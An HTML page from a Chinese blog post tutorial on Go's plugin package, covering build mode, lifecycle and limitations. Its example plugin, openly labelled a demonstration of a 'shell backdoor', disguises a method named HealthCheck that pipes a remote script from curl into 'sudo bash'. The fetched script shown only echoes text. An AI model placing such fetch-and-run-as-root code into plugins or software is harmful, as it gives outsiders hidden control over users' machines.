@@ -1,0 +1,610 @@
+<!doctype html>
+<html lang="zh">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+
+    <title>Go插件plugin | 沧海的博客</title>
+    <meta property="og:title" content="Go插件plugin - 沧海的博客">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-12-09T21:47:11&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-12-09T21:47:11&#43;08:00'>
+        
+    <meta name="Keywords" content="golang,go语言,go语言笔记,沧海,xudong,旭东,kubernetes,istio,mesh,service mesh,yaml">
+    <meta name="description" content="Go插件plugin">
+        
+    <meta name="author" content="沧海">
+    <meta property="og:url" content="https://lxd5866.github.io/post/2020-12-09-3/">
+    <link rel="shortcut icon" href='/favicon.ico'  type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://lxd5866.github.io/">
+                        沧海的博客
+                    </a>
+                
+                <p class="description">K8s,ServiceMesh</p>
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="current" href="https://lxd5866.github.io/">首页</a>
+                    
+                    <a  href="https://lxd5866.github.io/post/about" title="关于">关于</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    <style type="text/css">
+    .post-toc {
+        position: fixed;
+        width: 200px;
+        margin-left: -210px;
+        padding: 5px 10px;
+        font-family: Athelas, STHeiti, Microsoft Yahei, serif;
+        font-size: 12px;
+        border: 1px solid rgba(0, 0, 0, .07);
+        border-radius: 5px;
+        background-color: rgba(255, 255, 255, 0.98);
+        background-clip: padding-box;
+        -webkit-box-shadow: 1px 1px 2px rgba(0, 0, 0, .125);
+        box-shadow: 1px 1px 2px rgba(0, 0, 0, .125);
+        word-wrap: break-word;
+        white-space: nowrap;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        z-index: 999;
+        cursor: pointer;
+        max-height: 70%;
+        overflow-y: auto;
+        overflow-x: hidden;
+    }
+
+    .post-toc .post-toc-title {
+        width: 100%;
+        margin: 0 auto;
+        font-size: 20px;
+        font-weight: 400;
+        text-transform: uppercase;
+        text-align: center;
+    }
+
+    .post-toc .post-toc-content {
+        font-size: 15px;
+    }
+
+    .post-toc .post-toc-content>nav>ul {
+        margin: 10px 0;
+    }
+
+    .post-toc .post-toc-content ul {
+        padding-left: 20px;
+        list-style: square;
+        margin: 0.5em;
+        line-height: 1.8em;
+    }
+
+    .post-toc .post-toc-content ul ul {
+        padding-left: 15px;
+        display: none;
+    }
+
+    @media print,
+    screen and (max-width:1057px) {
+        .post-toc {
+            display: none;
+        }
+    }
+</style>
+<div class="post-toc" style="position: absolute; top: 188px;">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#go插件plugin">Go插件plugin</a></li>
+    <li><a href="#1-go-plugin是什么">1. Go plugin是什么</a></li>
+    <li><a href="#2-go-plugin生命周期">2. Go plugin生命周期</a></li>
+    <li><a href="#3-go-plugin应用场景">3. Go plugin应用场景</a></li>
+    <li><a href="#4-go-plugin-示例">4. Go plugin 示例</a>
+      <ul>
+        <li><a href="#41-编写插件plugin代码">4.1 编写插件plugin代码</a></li>
+        <li><a href="#42-使用plugin插件">4.2 使用plugin插件</a></li>
+        <li><a href="#43-build-plugin程序">4.3 build plugin程序</a></li>
+        <li><a href="#44-go-run">4.4 go run</a></li>
+      </ul>
+    </li>
+    <li><a href="#5go语言plugin局限和不足">5.Go语言plugin局限和不足</a>
+      <ul>
+        <li><a href="#51-go版本兼容问题">5.1 Go版本兼容问题</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-总结">6. 总结</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+<script type="text/javascript">
+    $(document).ready(function () {
+        var postToc = $(".post-toc");
+        if (postToc.length) {
+            var leftPos = $("#main").offset().left;
+            if(leftPos<220){
+                postToc.css({"width":leftPos-10,"margin-left":(0-leftPos)})
+            }
+
+            var t = postToc.offset().top - 20,
+                a = {
+                    start: {
+                        position: "absolute",
+                        top: t
+                    },
+                    process: {
+                        position: "fixed",
+                        top: 20
+                    },
+                };
+            $(window).scroll(function () {
+                var e = $(window).scrollTop();
+                e < t ? postToc.css(a.start) : postToc.css(a.process)
+            })
+        }
+    })
+</script>
+    <article class="post">
+        <header>
+            <h1 class="post-title">Go插件plugin</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年12月9日
+        </date>
+        
+        <div class="post-meta">
+            <span>|</span>
+            
+            <span class="meta-category"><a href='/categories/Golang'>Golang</a></span>
+            
+        </div>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            <h2 id="go插件plugin">Go插件plugin</h2>
+<blockquote>
+<p>背景
+项目需要在不给项目源码的情况下，给三方做拓展。实现方案是通过配置，加载plugin，调用约定好的方法实现特定的业务场景</p>
+</blockquote>
+<p><a href="https://mojotv.cn/go/golang-plugin-tutorial">原文地址</a></p>
+<h2 id="1-go-plugin是什么">1. Go plugin是什么</h2>
+<p>Go 1.8版本开始提供了一个创建共享库的新工具,称为 Plugins.</p>
+<blockquote>
+<p>A plugin is a Go main package with exported functions and variables that has been built with: <code>go build -buildmode=plugin</code></p>
+</blockquote>
+<p>Plugin插件是包含可导出(可访问)的function和变量的<em><strong>main package</strong></em>编译(<code>go build -buildmode=plugin</code>)之后的文件.</p>
+<p>同时官方文档也提示了：Currently plugins are only supported on Linux and macOS .它目前支持Linux和Mac操作系统(不支持windows)</p>
+<p><a href="https://golang.google.cn/pkg/plugin/#pkg-overview">官方文档地址</a></p>
+<h2 id="2-go-plugin生命周期">2. Go plugin生命周期</h2>
+<blockquote>
+<p>When a plugin is first opened, the init functions of all packages not already part of the program are called. The main function is not run. A plugin is only initialized once, and cannot be closed.</p>
+</blockquote>
+<p>plugin插件被打开加载 <code>plugin.Open(&quot;***.so&quot;)</code> ,插件的<code>init</code>初始化函数才开始执行. 也就是说main函数执行前plugin的init函数是不会执行的. 插件只被初始化一次,不能被关闭.</p>
+<p>使用plugin的main.go生命周期</p>
+<ol>
+<li>main.go的init函数执行</li>
+<li>开始执行main.go main函数</li>
+<li>开始执行<code>plugin.Open(&quot;***.so&quot;)</code>打开插件</li>
+<li>插件开始执行内部的<code>init</code>函数</li>
+</ol>
+<h2 id="3-go-plugin应用场景">3. Go plugin应用场景</h2>
+<ul>
+<li>1.通过plugin我们可以很方便的对于不同功能加载相应的模块并调用相关的模块;</li>
+<li>2.针对不同语言(英文,汉语,德语……)加载不同的语言so文件,进行不同的输出;</li>
+<li>3.编译出的文件给不同的编程语言用(如：c/java/python/lua等).</li>
+<li>4.*<strong>需要加密的核心算法,核心业务逻辑可以可以编译成plugin插件*</strong></li>
+<li>5.*<strong>黑客预留的后门backdoor可以使用plugin*</strong></li>
+<li>6.*<strong>函数集动态加载*</strong></li>
+</ul>
+<h2 id="4-go-plugin-示例">4. Go plugin 示例</h2>
+<p>这个示例建展示一下两方面内容:</p>
+<ol>
+<li>演示plugin插件的<code>init</code>的执行顺序</li>
+<li>演示怎么编写一个shell黑客后门</li>
+</ol>
+<h3 id="41-编写插件plugin代码">4.1 编写插件plugin代码</h3>
+<p>直接上代码 plugin_bad_docter.go</p>
+<pre><code>package main
+
+import (
+	&quot;log&quot;
+	&quot;os/exec&quot;
+	&quot;time&quot;
+)
+
+func init() {
+	log.Println(&quot;plugin init function called&quot;)
+}
+
+type BadNastyDoctor string
+
+func (g BadNastyDoctor) HealthCheck() error {
+	bs,err := exec.Command(&quot;bash&quot;,&quot;-c&quot;,&quot;curl -s 'https://tech.mojotv.cn/test.sh' | sudo bash -s 'arg000' 'arg001'&quot;).CombinedOutput()
+	if err != nil {
+		return err
+
+	}
+	log.Println(&quot;now is&quot;,g)
+	log.Println(&quot;shell has executed -&gt;&gt;&gt;&gt;&gt;&quot;,string(bs))
+	return nil
+}
+
+//go build -buildmode=plugin -o=plugin_doctor.so plugin_bad_docter.go
+
+// exported as symbol named &quot;Doctor&quot;
+var Doctor = BadNastyDoctor(time.Now().Format(time.RFC3339))
+</code></pre><p>编写plugin插件要点</p>
+<ol>
+<li>包名称必须是main</li>
+<li>没有main函数</li>
+<li>必须有可以导出(访问)的变量或者方法</li>
+</ol>
+<p>编写完成之后使用编译plugin</p>
+<pre><code>$ go build -buildmode=plugin -o=plugin_doctor.so plugin_bad_docter.go 
+$ ll
+总用量 6300
+-rw-r--r-- 1 pi pi     612 9月   6  2019 plugin_bad_docter.go
+-rw-r--r-- 1 pi pi 3493654 9月   6 17:06 plugin_doctor.so
+-rw-r--r-- 1 pi pi     274 9月   6 16:37 readme.md
+$ file plugin_doctor.so 
+plugin_doctor.so: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically linked, BuildID[sha1]=9034047846f679f66ff7ac50f73aa7baf90d5e5d, not stripped
+</code></pre><h3 id="42-使用plugin插件">4.2 使用plugin插件</h3>
+<p>使用加载plugin基本流程</p>
+<ol>
+<li>加载编译好的插件 <code>plugin.Open(&quot;./plugin_doctor.so&quot;)</code> (*.so文件路径相对与可执行文件的路径,可以是绝对路径)</li>
+<li>寻找插件可到变量 <code>plug.Lookup(&quot;Doctor&quot;)</code>,</li>
+<li>TypeAssert: Symbol(interface{}) 转换成API的接口类型</li>
+<li>执行API interface的方法</li>
+</ol>
+<p><a href="https://tech.mojotv.cn/test.sh">远程shell脚本内容</a></p>
+<pre><code>#!/usr/bin/env bash
+#--destination _deploy
+echo &quot;golang plugin remote shell&quot;  $0 $1 $2
+</code></pre><p>/plugin/use_plugin_example.go</p>
+<pre><code>package main
+
+import (
+	&quot;fmt&quot;
+	&quot;log&quot;
+	&quot;os&quot;
+	&quot;plugin&quot;
+)
+
+type GoodDoctor interface {
+	HealthCheck() error
+}
+
+func init()  {
+	log.Println(&quot;main package init function called&quot;)
+}
+
+func main() {
+	log.Println(&quot;main function stared&quot;)
+	// load module 插件您也可以使用go http.Request从远程下载到本地,在加载做到动态的执行不同的功能
+	// 1. open the so file to load the symbols
+
+	plug, err := plugin.Open(&quot;./plugin_doctor.so&quot;)
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(1)
+	}
+	log.Println(&quot;plugin opened&quot;)
+
+	// 2. look up a symbol (an exported function or variable)
+	// in this case, variable Greeter
+	doc, err := plug.Lookup(&quot;Doctor&quot;)
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(1)
+	}
+
+	// 3. Assert that loaded symbol is of a desired type
+	// in this case interface type GoodDoctor (defined above)
+	doctor, ok := doc.(GoodDoctor)
+	if !ok {
+		fmt.Println(&quot;unexpected type from module symbol&quot;)
+		os.Exit(1)
+	}
+
+	// 4. use the module
+	if err := doctor.HealthCheck(); err != nil {
+		log.Println(&quot;use plugin doctor failed, &quot;, err)
+	}
+}
+</code></pre><h3 id="43-build-plugin程序">4.3 build plugin程序</h3>
+<pre><code>$ go build use_plugin_example.go
+$ ll
+总用量 6300
+-rw-r--r-- 1 pi pi     612 9月   6 17:08 plugin_bad_docter.go
+-rw-r--r-- 1 pi pi 3493654 9月   6 17:06 plugin_doctor.so
+-rw-r--r-- 1 pi pi     274 9月   6 16:37 readme.md
+-rwxr-xr-x 1 pi pi 2941503 9月   6 17:15 use_plugin_example
+-rw-r--r-- 1 pi pi    1057 9月   6  2019 use_plugin_example.go
+$ file use_plugin_example
+use_plugin_example: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=fc60641527d9b030f9f4d5a477de300e9fb70541, not stripped
+</code></pre><h3 id="44-go-run">4.4 go run</h3>
+<pre><code>$ ./use_plugin_example 
+2019/09/06 17:16:23 main package init function called
+2019/09/06 17:16:23 main function stared
+2019/09/06 17:16:23 plugin init function called
+2019/09/06 17:16:23 plugin opened
+2019/09/06 17:16:23 now is 2019-09-06T17:16:23+08:00
+2019/09/06 17:16:23 shell has executed -&gt;&gt;&gt;&gt;&gt; golang plugin remote shell bash arg000 arg001
+</code></pre><h2 id="5go语言plugin局限和不足">5.Go语言plugin局限和不足</h2>
+<p>Go plugin 还不是一个成熟的解决方案.它迫使您的插件实现与主应用程序产生高度耦合.即使您可以控制插件和主应用程序, 最终结果也非常脆弱且难以维护.如果插件的作者对主应用程序没有任何控制权,开销会更高.</p>
+<h3 id="51-go版本兼容问题">5.1 Go版本兼容问题</h3>
+<p>插件实现和主应用程序都必须使用完全相同的Go工具链版本构建. 由于插件提供的代码将与主代码在相同的进程空间中运行, 因此编译的二进制文件应与主应用程序 100%兼容.</p>
+<h2 id="6-总结">6. 总结</h2>
+<p>我希望您记下的关键要点:</p>
+<ul>
+<li>1.Go插件从v1.8版本开始支持,它目前支持Linux和Mac操作系统(不支持windows)</li>
+<li>2.Go plugin包提供了一个简单的函数集动态加载,可以帮助开发人员编写可扩展的代码.</li>
+<li>3.Go插件是使用<code>go build -buildmode = plugin</code>构建标志编译</li>
+<li>4.Go插件包中的导出函数和公开变量,可以使用插件包在运行时查找并绑定调用.</li>
+<li>5.*<strong>Go runtime import插件的开发人员必须将插件视为黑盒子,做好各种最坏的假设*</strong></li>
+</ul>
+<p>代码和资料</p>
+<ul>
+<li><a href="https://github.com/libragen/felix/tree/master/plugin">示例代码</a></li>
+<li><a href="https://golang.google.cn/pkg/plugin/#pkg-overview">官方标准库文档</a></li>
+</ul>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/post/2020-12-07-1/">helm3 和 kustomize </a></li>
+        
+        <li><a href="/post/2020-12-09-1/">k8s Docker Runtime架构</a></li>
+        
+        <li><a href="/post/2020-12-04-1/">git 代理</a></li>
+        
+        <li><a href="/post/2020-12-02-1/">minikube 加速</a></li>
+        
+        <li><a href="/post/2020-11-24-1/">使用zap接收gin框架默认的日志并配置日志归档</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='/tags/Golang'>Golang</a></li>
+                
+                <li><a href='/tags/go-plugin'>go-plugin</a></li>
+                
+                <li><a href='/tags/plugn'>plugn</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://lxd5866.github.io/">沧海的博客 By 沧海</a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://lxd5866.github.io/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://lxd5866.github.io/">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://lxd5866.github.io/post/2020-12-09-3/" title="Go插件plugin">Go插件plugin</a>
+    </li>
+    
+    <li>
+        <a href="https://lxd5866.github.io/post/2020-12-07-1/" title="helm3 和 kustomize ">helm3 和 kustomize </a>
+    </li>
+    
+    <li>
+        <a href="https://lxd5866.github.io/post/2020-12-09-1/" title="k8s Docker Runtime架构">k8s Docker Runtime架构</a>
+    </li>
+    
+    <li>
+        <a href="https://lxd5866.github.io/post/2020-12-04-1/" title="git 代理">git 代理</a>
+    </li>
+    
+    <li>
+        <a href="https://lxd5866.github.io/post/2020-12-02-1/" title="minikube 加速">minikube 加速</a>
+    </li>
+    
+    <li>
+        <a href="https://lxd5866.github.io/post/2020-11-24-1/" title="使用zap接收gin框架默认的日志并配置日志归档">使用zap接收gin框架默认的日志并配置日志归档</a>
+    </li>
+    
+    <li>
+        <a href="https://lxd5866.github.io/post/about/" title="关于">关于</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href='/categories/'>分类</a></h3>
+<ul class="widget-list">
+    
+    <li><a href="https://lxd5866.github.io/categories/Golang/">Golang (1)</a></li>
+    
+    <li><a href="https://lxd5866.github.io/categories/k8s/">k8s (3)</a></li>
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href='/tags/'>标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://lxd5866.github.io/tags/CNI/">CNI</a>
+    
+    <a href="https://lxd5866.github.io/tags/CRI/">CRI</a>
+    
+    <a href="https://lxd5866.github.io/tags/Golang/">Golang</a>
+    
+    <a href="https://lxd5866.github.io/tags/docker/">docker</a>
+    
+    <a href="https://lxd5866.github.io/tags/go-plugin/">go-plugin</a>
+    
+    <a href="https://lxd5866.github.io/tags/k8s/">k8s</a>
+    
+    <a href="https://lxd5866.github.io/tags/plugn/">plugn</a>
+    
+</div>
+    </section>
+
+    
+<section class="widget">
+    <h3 class="widget-title">友情链接</h3>
+    <ul class="widget-list">
+        
+        <li>
+            <a target="_blank" href="https://lxd5866.github.io/" title="沧海的博客">沧海的博客</a>
+        </li>
+        
+    </ul>
+</section>
+
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://lxd5866.github.io/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
